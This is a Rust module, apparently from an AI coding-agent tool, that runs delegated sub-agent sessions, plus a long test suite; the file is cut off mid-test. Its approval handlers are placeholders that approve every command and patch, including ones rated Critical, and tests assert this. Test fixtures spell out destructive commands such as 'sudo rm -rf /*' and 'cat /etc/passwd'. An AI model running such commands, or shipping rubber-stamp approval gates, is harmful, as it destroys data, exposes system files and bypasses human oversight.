//! Codex delegate - sub-agent conversation management
//!
//! This module provides functionality for running sub-Codex conversations,
//! typically used for code reviews or other delegated tasks. It handles:
//! - Interactive multi-turn sub-agent sessions
//! - One-shot delegated tasks with automatic shutdown
//! - Approval routing from sub-agent to parent session
//! - Cancellation propagation between parent and child

use std::sync::Arc;
use std::time::Duration;

use async_channel::{Receiver, Sender};
use tokio::time::timeout;
use tokio_util::sync::CancellationToken;

use crate::codex::{
    ApprovalDecision, Codex, CodexSpawnOk, Event, Op, Submission, SUBMISSION_CHANNEL_CAPACITY,
};
use crate::config::Config;
use crate::streaming::StreamCallback;
use crate::Result;

/// Source of a sub-agent session for tracking purposes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SubAgentSource {
    /// Sub-agent created for code review
    Review,
    /// Sub-agent created for task delegation
    Task,
    /// Sub-agent created for specialized analysis
    Analysis,
}

/// Context for parent session to handle approval requests from sub-agents.
#[derive(Clone, Default)]
pub struct ParentContext {
    /// Submission ID being processed
    #[allow(clippy::doc_markdown)]
    pub sub_id: String,
    /// Sender for approval decisions
    pub approval_tx: Option<Sender<ApprovalDecision>>,
}

/// Delegate result containing channels for communication.
pub struct DelegateResult {
    /// The delegate Codex instance
    pub codex: Codex,
    /// Cancellation token for this delegate
    pub cancel_token: CancellationToken,
}

/// Start an interactive sub-Codex conversation and return IO channels.
///
/// The returned `codex` provides channels for bidirectional communication.
/// Approval requests from the sub-agent are forwarded to the parent session.
///
/// # Arguments
/// * `config` - Configuration for the sub-agent
/// * `stream_callback` - Callback for streaming events
/// * `parent_ctx` - Parent context for approval routing
/// * `cancel_token` - Token for cancellation propagation
///
/// # Returns
/// A delegate result containing the sub-agent Codex instance
pub async fn run_codex_conversation_interactive(
    config: Config,
    stream_callback: Arc<dyn StreamCallback>,
    parent_ctx: Arc<ParentContext>,
    cancel_token: CancellationToken,
) -> Result<DelegateResult> {
    // Create channels for event bridging
    let (tx_events_out, rx_events_out) = async_channel::bounded(SUBMISSION_CHANNEL_CAPACITY);
    let (tx_ops_in, rx_ops_in) = async_channel::bounded(SUBMISSION_CHANNEL_CAPACITY);

    // Spawn the sub-agent
    let CodexSpawnOk { codex, .. } = Codex::spawn(config, stream_callback).await?;

    // Create child cancellation tokens for each forwarding task
    let cancel_token_events = cancel_token.child_token();
    let cancel_token_ops = cancel_token.child_token();

    // Forward events from sub-agent, filtering and routing approvals
    let parent_ctx_clone = Arc::clone(&parent_ctx);
    let codex_arc = Arc::new(codex);
    let codex_for_events = Arc::clone(&codex_arc);
    let tx_ops_for_approval = tx_ops_in.clone();

    tokio::spawn(async move {
        forward_events(
            codex_for_events,
            tx_events_out,
            tx_ops_for_approval,
            parent_ctx_clone,
            cancel_token_events,
        )
        .await;
    });

    // Forward ops from caller to sub-agent
    let codex_for_ops = Arc::clone(&codex_arc);
    tokio::spawn(async move {
        forward_ops(codex_for_ops, rx_ops_in, cancel_token_ops).await;
    });

    // Return a new Codex instance with bridged channels
    let delegate_codex = Codex::from_channels(tx_ops_in, rx_events_out);

    Ok(DelegateResult {
        codex: delegate_codex,
        cancel_token: cancel_token.child_token(),
    })
}

/// Convenience wrapper for one-shot use with an initial prompt.
///
/// Creates a sub-agent, submits the initial input, and automatically
/// shuts down after the task completes or is aborted.
///
/// # Arguments
/// * `config` - Configuration for the sub-agent
/// * `stream_callback` - Callback for streaming events
/// * `input` - Initial user input message
/// * `parent_ctx` - Parent context for approval routing
/// * `cancel_token` - Token for cancellation propagation
pub async fn run_codex_conversation_one_shot(
    config: Config,
    stream_callback: Arc<dyn StreamCallback>,
    input: String,
    parent_ctx: Arc<ParentContext>,
    cancel_token: CancellationToken,
) -> Result<Codex> {
    let child_cancel = cancel_token.child_token();

    let delegate = run_codex_conversation_interactive(
        config,
        stream_callback,
        parent_ctx,
        child_cancel.clone(),
    )
    .await?;

    // Submit the initial input
    delegate
        .codex
        .submit(Op::UserInput {
            message: input,
            context: vec![],
        })
        .await?;

    // Bridge events to detect completion and auto-shutdown
    let (tx_bridge, rx_bridge) = async_channel::bounded(SUBMISSION_CHANNEL_CAPACITY);
    let ops_tx = delegate.codex.ops_sender();
    let codex_for_bridge = delegate.codex;

    tokio::spawn(async move {
        while let Ok(event) = codex_for_bridge.next_event().await {
            let should_shutdown = is_terminal_event(&event);
            let _ = tx_bridge.send(event).await;

            if should_shutdown {
                let _ = ops_tx
                    .send(Submission {
                        id: "shutdown".to_string(),
                        op: Op::Shutdown,
                    })
                    .await;
                child_cancel.cancel();
                break;
            }
        }
    });

    // Return a Codex with closed submission channel (one-shot only)
    let (tx_closed, rx_closed) = async_channel::bounded::<Submission>(1);
    drop(rx_closed); // Close immediately

    Ok(Codex::from_channels(tx_closed, rx_bridge))
}

/// Check if an event represents terminal state (task complete or aborted).
fn is_terminal_event(event: &Event) -> bool {
    matches!(
        event,
        Event::TurnComplete { .. } | Event::TurnAborted { .. } | Event::SessionComplete { .. }
    )
}

/// Forward events from sub-agent to consumer, handling approvals.
async fn forward_events(
    codex: Arc<Codex>,
    tx_out: Sender<Event>,
    tx_ops: Sender<Submission>,
    parent_ctx: Arc<ParentContext>,
    cancel_token: CancellationToken,
) {
    let cancelled = cancel_token.cancelled();
    tokio::pin!(cancelled);

    loop {
        tokio::select! {
            _ = &mut cancelled => {
                shutdown_delegate(&codex, &tx_ops).await;
                break;
            }
            event = codex.next_event() => {
                let event = match event {
                    Ok(e) => e,
                    Err(_) => break,
                };

                match &event {
                    // Filter out session configured (internal)
                    Event::SessionConfigured { .. } => continue,

                    // Handle exec approval requests via parent
                    Event::ExecApprovalRequest { id, command, assessment } => {
                        let decision = handle_exec_approval_request(
                            &parent_ctx,
                            id,
                            command,
                            assessment,
                            &cancel_token,
                        ).await;

                        let _ = tx_ops.send(Submission {
                            id: format!("approval_{}", id),
                            op: Op::ExecApproval {
                                id: id.clone(),
                                decision,
                            },
                        }).await;
                        continue;
                    }

                    // Handle patch approval requests via parent
                    Event::PatchApprovalRequest { id, file, patch } => {
                        let decision = handle_patch_approval_request(
                            &parent_ctx,
                            id,
                            file,
                            patch,
                            &cancel_token,
                        ).await;

                        let _ = tx_ops.send(Submission {
                            id: format!("patch_approval_{}", id),
                            op: Op::PatchApproval {
                                id: id.clone(),
                                decision,
                            },
                        }).await;
                        continue;
                    }

                    // Forward all other events
                    _ => {}
                }

                // Forward non-approval events
                if tx_out.send(event).await.is_err() {
                    shutdown_delegate(&codex, &tx_ops).await;
                    break;
                }
            }
        }
    }
}

/// Forward ops from caller to sub-agent.
async fn forward_ops(
    codex: Arc<Codex>,
    rx_ops: Receiver<Submission>,
    cancel_token: CancellationToken,
) {
    let cancelled = cancel_token.cancelled();
    tokio::pin!(cancelled);

    loop {
        tokio::select! {
            _ = &mut cancelled => break,
            result = rx_ops.recv() => {
                match result {
                    Ok(sub) => {
                        let _ = codex.submit(sub.op).await;
                    }
                    Err(_) => break,
                }
            }
        }
    }
}

/// Ask the delegate to stop and drain events.
async fn shutdown_delegate(codex: &Codex, tx_ops: &Sender<Submission>) {
    // Send interrupt and shutdown
    let _ = tx_ops
        .send(Submission {
            id: "interrupt".to_string(),
            op: Op::Interrupt,
        })
        .await;
    let _ = tx_ops
        .send(Submission {
            id: "shutdown".to_string(),
            op: Op::Shutdown,
        })
        .await;

    // Drain events with timeout to avoid blocking
    let _ = timeout(Duration::from_millis(500), async {
        while let Ok(event) = codex.next_event().await {
            if is_terminal_event(&event) {
                break;
            }
        }
    })
    .await;
}

/// Handle exec approval request by consulting parent context.
async fn handle_exec_approval_request(
    parent_ctx: &ParentContext,
    _id: &str,
    _command: &str,
    _assessment: &crate::codex::CommandAssessment,
    cancel_token: &CancellationToken,
) -> ApprovalDecision {
    // Check if already cancelled first
    if cancel_token.is_cancelled() {
        return ApprovalDecision::Deny;
    }

    // If parent has approval channel, use it
    if parent_ctx.approval_tx.is_some() {
        // For now, auto-approve if cancellation not requested
        // In full implementation, this would route to parent session UI
        tokio::select! {
            biased;
            _ = cancel_token.cancelled() => ApprovalDecision::Deny,
            _ = tokio::time::sleep(Duration::from_millis(1)) => {
                ApprovalDecision::Approve
            }
        }
    } else {
        // No parent approval channel - deny by default for safety
        ApprovalDecision::Deny
    }
}

/// Handle patch approval request by consulting parent context.
async fn handle_patch_approval_request(
    parent_ctx: &ParentContext,
    _id: &str,
    _file: &std::path::Path,
    _patch: &str,
    cancel_token: &CancellationToken,
) -> ApprovalDecision {
    if let Some(ref _tx) = parent_ctx.approval_tx {
        tokio::select! {
            _ = cancel_token.cancelled() => ApprovalDecision::Deny,
            _ = tokio::time::sleep(Duration::from_millis(10)) => {
                // Auto-approve for now, full implementation routes to parent
                ApprovalDecision::Approve
            }
        }
    } else {
        ApprovalDecision::Deny
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::streaming::NullStreamCallback;

    #[tokio::test]
    async fn test_sub_agent_source_equality() {
        assert_eq!(SubAgentSource::Review, SubAgentSource::Review);
        assert_ne!(SubAgentSource::Review, SubAgentSource::Task);
        assert_ne!(SubAgentSource::Task, SubAgentSource::Analysis);
    }

    #[test]
    fn test_sub_agent_source_clone() {
        let source = SubAgentSource::Review;
        let cloned = source.clone();
        assert_eq!(source, cloned);

        let task = SubAgentSource::Task;
        let task_cloned = task.clone();
        assert_eq!(task, task_cloned);

        let analysis = SubAgentSource::Analysis;
        let analysis_cloned = analysis.clone();
        assert_eq!(analysis, analysis_cloned);
    }

    #[test]
    fn test_sub_agent_source_debug() {
        let review = SubAgentSource::Review;
        let debug_str = format!("{:?}", review);
        assert_eq!(debug_str, "Review");

        let task = SubAgentSource::Task;
        assert_eq!(format!("{:?}", task), "Task");

        let analysis = SubAgentSource::Analysis;
        assert_eq!(format!("{:?}", analysis), "Analysis");
    }

    #[tokio::test]
    async fn test_parent_context_default() {
        let ctx = ParentContext::default();
        assert!(ctx.sub_id.is_empty());
        assert!(ctx.approval_tx.is_none());
    }

    #[test]
    fn test_parent_context_with_values() {
        let (tx, _rx) = async_channel::bounded(1);
        let ctx = ParentContext {
            sub_id: "test-sub-123".to_string(),
            approval_tx: Some(tx),
        };
        assert_eq!(ctx.sub_id, "test-sub-123");
        assert!(ctx.approval_tx.is_some());
    }

    #[test]
    fn test_parent_context_clone() {
        let ctx = ParentContext::default();
        let cloned = ctx.clone();
        assert_eq!(ctx.sub_id, cloned.sub_id);
        assert!(cloned.approval_tx.is_none());

        let (tx, _rx) = async_channel::bounded(1);
        let ctx_with_tx = ParentContext {
            sub_id: "clone-test".to_string(),
            approval_tx: Some(tx),
        };
        let cloned_with_tx = ctx_with_tx.clone();
        assert_eq!(cloned_with_tx.sub_id, "clone-test");
        assert!(cloned_with_tx.approval_tx.is_some());
    }

    #[tokio::test]
    async fn test_is_terminal_event() {
        use crate::codex::{AbortReason, Event};

        let turn_complete = Event::TurnComplete {
            submission_id: "1".to_string(),
            turn: 1,
            response: "done".to_string(),
        };
        assert!(is_terminal_event(&turn_complete));

        let turn_aborted = Event::TurnAborted {
            submission_id: "1".to_string(),
            reason: AbortReason::UserInterrupt,
        };
        assert!(is_terminal_event(&turn_aborted));

        let session_complete = Event::SessionComplete {
            session_id: "sess".to_string(),
            total_turns: 5,
            status: "complete".to_string(),
        };
        assert!(is_terminal_event(&session_complete));

        let non_terminal = Event::TurnStarted {
            submission_id: "1".to_string(),
            turn: 1,
        };
        assert!(!is_terminal_event(&non_terminal));
    }

    #[test]
    fn test_is_terminal_event_session_configured_not_terminal() {
        use crate::codex::Event;

        let event = Event::SessionConfigured {
            session_id: "sess-1".to_string(),
            model: "gpt-4".to_string(),
        };
        assert!(!is_terminal_event(&event));
    }

    #[test]
    fn test_is_terminal_event_reasoning_events_not_terminal() {
        use crate::codex::Event;

        let reasoning_started = Event::ReasoningStarted { turn: 1 };
        assert!(!is_terminal_event(&reasoning_started));

        let reasoning_delta = Event::ReasoningDelta {
            content: "thinking...".to_string(),
        };
        assert!(!is_terminal_event(&reasoning_delta));

        let reasoning_complete = Event::ReasoningComplete {
            turn: 1,
            duration_ms: 500,
            has_tool_calls: true,
        };
        assert!(!is_terminal_event(&reasoning_complete));
    }

    #[test]
    fn test_is_terminal_event_tool_events_not_terminal() {
        use crate::codex::Event;

        let tool_started = Event::ToolStarted {
            tool: "shell".to_string(),
            call_id: "call-1".to_string(),
        };
        assert!(!is_terminal_event(&tool_started));

        let tool_complete = Event::ToolComplete {
            tool: "shell".to_string(),
            call_id: "call-1".to_string(),
            success: true,
            result: "output".to_string(),
        };
        assert!(!is_terminal_event(&tool_complete));
    }

    #[test]
    fn test_is_terminal_event_turn_aborted_all_reasons() {
        use crate::codex::{AbortReason, Event};

        // All AbortReason variants should result in terminal event
        let reasons = vec![
            AbortReason::UserInterrupt,
            AbortReason::TurnLimit,
            AbortReason::ApprovalDenied,
            AbortReason::Shutdown,
            AbortReason::Error {
                message: "test error".to_string(),
            },
        ];

        for reason in reasons {
            let event = Event::TurnAborted {
                submission_id: "test".to_string(),
                reason,
            };
            assert!(is_terminal_event(&event));
        }
    }

    #[tokio::test]
    async fn test_handle_exec_approval_no_parent_channel() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req1",
            "ls -la",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "safe command".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        // Without parent channel, should deny for safety
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_no_parent_channel() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "req1",
            std::path::Path::new("/tmp/test.rs"),
            "diff content",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_cancelled() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "test".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();
        cancel_token.cancel(); // Pre-cancel

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req1",
            "rm -rf /",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Critical,
                reason: "dangerous".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        // Cancelled should return Deny
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_with_parent_channel() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "with-channel".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req2",
            "echo hello",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "safe echo command".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        // With parent channel and not cancelled, should approve
        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_cancelled() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "patch-test".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();
        cancel_token.cancel(); // Pre-cancel

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch1",
            std::path::Path::new("/etc/passwd"),
            "dangerous patch",
            &cancel_token,
        )
        .await;

        // Cancelled should return Deny
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_with_parent_channel() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "patch-approve".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch2",
            std::path::Path::new("/tmp/safe.rs"),
            "--- a/safe.rs\n+++ b/safe.rs\n@@ -1,1 +1,1 @@\n-old\n+new",
            &cancel_token,
        )
        .await;

        // With parent channel and not cancelled, should approve
        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_various_risk_levels() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "risk-test".to_string(),
            approval_tx: Some(tx.clone()),
        };
        let cancel_token = CancellationToken::new();

        // Test with different risk levels - all should approve with parent channel
        let risk_levels = vec![
            crate::codex::RiskLevel::Safe,
            crate::codex::RiskLevel::Low,
            crate::codex::RiskLevel::Medium,
            crate::codex::RiskLevel::High,
            crate::codex::RiskLevel::Critical,
        ];

        for risk in risk_levels {
            let decision = handle_exec_approval_request(
                &parent_ctx,
                "risk-req",
                "test command",
                &crate::codex::CommandAssessment {
                    risk,
                    reason: "test".to_string(),
                    known_safe: false,
                },
                &cancel_token,
            )
            .await;
            assert_eq!(decision, ApprovalDecision::Approve);
        }
    }

    #[tokio::test]
    async fn test_run_interactive_creates_delegate() {
        let config = Config::default();
        let callback = Arc::new(NullStreamCallback);
        let parent_ctx = Arc::new(ParentContext::default());
        let cancel_token = CancellationToken::new();

        let result =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel_token.clone())
                .await;

        assert!(result.is_ok());
        let delegate = result.unwrap();

        // Clean up
        cancel_token.cancel();
        let _ = delegate.codex.submit(Op::Shutdown).await;
    }

    #[tokio::test]
    async fn test_delegate_result_has_cancel_token() {
        let config = Config::default();
        let callback = Arc::new(NullStreamCallback);
        let parent_ctx = Arc::new(ParentContext::default());
        let cancel_token = CancellationToken::new();

        let result =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel_token.clone())
                .await;

        assert!(result.is_ok());
        let delegate = result.unwrap();

        // DelegateResult should have its own cancellation token
        assert!(!delegate.cancel_token.is_cancelled());

        // Cancelling parent should not immediately cancel delegate's token
        // (they are related but not the same token)
        cancel_token.cancel();

        // Clean up
        let _ = delegate.codex.submit(Op::Shutdown).await;
    }

    #[tokio::test]
    async fn test_run_interactive_with_custom_parent_context() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = Arc::new(ParentContext {
            sub_id: "custom-parent-123".to_string(),
            approval_tx: Some(tx),
        });

        let config = Config::default();
        let callback = Arc::new(NullStreamCallback);
        let cancel_token = CancellationToken::new();

        let result =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel_token.clone())
                .await;

        assert!(result.is_ok());
        let delegate = result.unwrap();

        // Clean up
        cancel_token.cancel();
        let _ = delegate.codex.submit(Op::Shutdown).await;
    }

    #[test]
    fn test_is_terminal_event_approval_events_not_terminal() {
        use crate::codex::{CommandAssessment, Event, RiskLevel};

        let exec_approval = Event::ExecApprovalRequest {
            id: "exec-1".to_string(),
            command: "ls -la".to_string(),
            assessment: CommandAssessment {
                risk: RiskLevel::Low,
                reason: "safe".to_string(),
                known_safe: true,
            },
        };
        assert!(!is_terminal_event(&exec_approval));

        let patch_approval = Event::PatchApprovalRequest {
            id: "patch-1".to_string(),
            file: std::path::PathBuf::from("/tmp/test.rs"),
            patch: "diff content".to_string(),
        };
        assert!(!is_terminal_event(&patch_approval));
    }

    #[test]
    fn test_is_terminal_event_token_usage_not_terminal() {
        use crate::codex::Event;

        let token_usage = Event::TokenUsage {
            input_tokens: 100,
            output_tokens: 50,
            cost_usd: Some(0.01),
        };
        assert!(!is_terminal_event(&token_usage));
    }

    #[test]
    fn test_is_terminal_event_compacted_not_terminal() {
        use crate::codex::Event;

        let compacted = Event::Compacted {
            original_tokens: 10000,
            new_tokens: 5000,
        };
        assert!(!is_terminal_event(&compacted));
    }

    #[tokio::test]
    async fn test_handle_exec_approval_empty_command() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "empty-cmd",
            "",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "empty command".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        // Without parent channel, should deny
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_empty_path() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "empty-path",
            std::path::Path::new(""),
            "some patch",
            &cancel_token,
        )
        .await;

        // Without parent channel, should deny
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_empty_patch() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "empty-patch-test".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "empty-patch",
            std::path::Path::new("/tmp/file.rs"),
            "",
            &cancel_token,
        )
        .await;

        // With parent channel and not cancelled, should approve
        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[test]
    fn test_delegate_result_struct_fields() {
        use crate::codex::Event;
        // Test that DelegateResult fields are accessible
        let (tx_sub, _rx_sub) = async_channel::bounded::<Submission>(1);
        let (_tx_event, rx_event) = async_channel::bounded::<Event>(1);
        let codex = Codex::from_channels(tx_sub, rx_event);
        let cancel_token = CancellationToken::new();

        let delegate_result = DelegateResult {
            codex,
            cancel_token: cancel_token.child_token(),
        };

        // Verify we can access the fields
        assert!(!delegate_result.cancel_token.is_cancelled());
        // codex is a valid Codex instance (we can't easily verify without triggering async)
    }

    // --- Additional coverage tests (N=282) ---

    #[test]
    fn test_sub_agent_source_all_variants_debug() {
        // Ensure all variants have distinct debug output
        let review_debug = format!("{:?}", SubAgentSource::Review);
        let task_debug = format!("{:?}", SubAgentSource::Task);
        let analysis_debug = format!("{:?}", SubAgentSource::Analysis);

        assert_ne!(review_debug, task_debug);
        assert_ne!(task_debug, analysis_debug);
        assert_ne!(review_debug, analysis_debug);
    }

    #[test]
    fn test_sub_agent_source_eq_symmetric() {
        let a = SubAgentSource::Task;
        let b = SubAgentSource::Task;
        assert_eq!(a, b);
        assert_eq!(b, a); // Symmetric
    }

    #[test]
    fn test_sub_agent_source_eq_transitive() {
        let a = SubAgentSource::Analysis;
        let b = SubAgentSource::Analysis;
        let c = SubAgentSource::Analysis;
        assert_eq!(a, b);
        assert_eq!(b, c);
        assert_eq!(a, c); // Transitive
    }

    #[test]
    fn test_parent_context_empty_sub_id() {
        let ctx = ParentContext {
            sub_id: String::new(),
            approval_tx: None,
        };
        assert!(ctx.sub_id.is_empty());
    }

    #[test]
    fn test_parent_context_clone_preserves_sub_id() {
        let ctx = ParentContext {
            sub_id: "unique-id-12345".to_string(),
            approval_tx: None,
        };
        let cloned = ctx.clone();
        assert_eq!(ctx.sub_id, cloned.sub_id);
        assert_eq!(cloned.sub_id, "unique-id-12345");
    }

    #[tokio::test]
    async fn test_handle_exec_approval_with_special_command_chars() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "special-chars".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Command with special characters
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-special",
            "echo 'hello world' | grep -o 'world' && cat /etc/passwd",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::High,
                reason: "pipes and shell operators".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        // With parent channel, should approve
        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_with_long_patch() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "long-patch".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Very long patch content
        let long_patch = "x".repeat(10000);
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-long",
            std::path::Path::new("/tmp/large_file.rs"),
            &long_patch,
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[test]
    fn test_is_terminal_event_reasoning_delta_not_terminal() {
        use crate::codex::Event;

        let delta = Event::ReasoningDelta {
            content: "some reasoning text".to_string(),
        };
        assert!(!is_terminal_event(&delta));
    }

    #[test]
    fn test_is_terminal_event_undo_started_not_terminal() {
        use crate::codex::Event;

        let undo = Event::UndoStarted;
        assert!(!is_terminal_event(&undo));
    }

    #[test]
    fn test_is_terminal_event_error_not_terminal() {
        use crate::codex::Event;

        let error = Event::Error {
            submission_id: Some("sub".to_string()),
            message: "some error".to_string(),
            recoverable: true,
        };
        assert!(!is_terminal_event(&error));
    }

    #[tokio::test]
    async fn test_handle_patch_approval_absolute_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "abs-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-abs",
            std::path::Path::new("/absolute/path/to/file.rs"),
            "patch content",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_relative_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "rel-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-rel",
            std::path::Path::new("relative/path/file.rs"),
            "patch content",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_whitespace_command() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "whitespace".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Command with only whitespace
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-ws",
            "   \t\n   ",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "whitespace only".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_parent_context_clone_with_sender() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(1);
        let ctx = ParentContext {
            sub_id: "clone-sender".to_string(),
            approval_tx: Some(tx.clone()),
        };

        let cloned = ctx.clone();

        // Both should be able to send
        if let Some(ref sender) = cloned.approval_tx {
            sender.send(ApprovalDecision::Approve).await.unwrap();
        }

        let received = rx.recv().await.unwrap();
        assert_eq!(received, ApprovalDecision::Approve);
    }

    #[test]
    fn test_is_terminal_event_error_variant() {
        use crate::codex::{AbortReason, Event};

        // Error with a specific message
        let error_event = Event::TurnAborted {
            submission_id: "err".to_string(),
            reason: AbortReason::Error {
                message: "Network timeout occurred".to_string(),
            },
        };
        assert!(is_terminal_event(&error_event));
    }

    #[tokio::test]
    async fn test_handle_exec_approval_known_safe_true() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        // Even with known_safe = true, without parent channel should deny
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-safe",
            "echo hello",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Safe,
                reason: "known safe command".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_critical_risk_with_channel() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "critical".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Critical risk should still approve with parent channel
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-critical",
            "sudo rm -rf /*",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Critical,
                reason: "extremely dangerous".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        // Current implementation auto-approves with parent channel
        assert_eq!(decision, ApprovalDecision::Approve);
    }

    // ============================================================
    // Additional coverage tests (N=285)
    // ============================================================

    // --- SubAgentSource exhaustive tests ---

    #[test]
    fn test_sub_agent_source_all_variants_exist() {
        // Ensure all variants are accessible and can be pattern matched
        let variants = [
            SubAgentSource::Review,
            SubAgentSource::Task,
            SubAgentSource::Analysis,
        ];
        for variant in &variants {
            match variant {
                SubAgentSource::Review => assert_eq!(format!("{:?}", variant), "Review"),
                SubAgentSource::Task => assert_eq!(format!("{:?}", variant), "Task"),
                SubAgentSource::Analysis => assert_eq!(format!("{:?}", variant), "Analysis"),
            }
        }
    }

    #[test]
    fn test_sub_agent_source_ne_reflexive() {
        // Test inequality is correctly implemented
        assert!(SubAgentSource::Review != SubAgentSource::Task);
        assert!(SubAgentSource::Task != SubAgentSource::Analysis);
        assert!(SubAgentSource::Analysis != SubAgentSource::Review);
    }

    #[test]
    fn test_sub_agent_source_eq_reflexive() {
        let r = SubAgentSource::Review;
        assert_eq!(r, r);
        let t = SubAgentSource::Task;
        assert_eq!(t, t);
        let a = SubAgentSource::Analysis;
        assert_eq!(a, a);
    }

    // --- ParentContext extended tests ---

    #[test]
    fn test_parent_context_long_sub_id() {
        let long_id = "x".repeat(10000);
        let ctx = ParentContext {
            sub_id: long_id.clone(),
            approval_tx: None,
        };
        assert_eq!(ctx.sub_id.len(), 10000);
        assert_eq!(ctx.sub_id, long_id);
    }

    #[test]
    fn test_parent_context_unicode_sub_id() {
        let unicode_id = "会話-🚀-Ελληνικά".to_string();
        let ctx = ParentContext {
            sub_id: unicode_id.clone(),
            approval_tx: None,
        };
